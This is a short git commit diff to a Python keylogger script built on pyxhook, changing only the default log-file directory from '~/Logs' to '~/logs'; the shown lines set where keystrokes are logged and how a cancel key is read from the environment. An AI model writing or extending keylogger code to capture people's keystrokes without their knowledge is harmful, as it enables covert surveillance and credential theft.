5bbbcb02b3b78bbb7adfe48ecb0cc21111a2fb34
n-anselm <54299223+n-anselm@users.noreply.github.com>
2022-02-11 16:53:28 -0600

    Update keylogger.py

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -8,7 +8,7 @@ import pyxhook
 # or use the default ~/Desktop/keylogs.log
 log_file = os.environ.get(
 	'pylogger_file',
-	os.path.expanduser('~/Logs/keylogs.log')
+	os.path.expanduser('~/logs/keylogs.log')
 )
 # Allow setting the cancel key from environment args, Default: `
 cancel_key = ord(
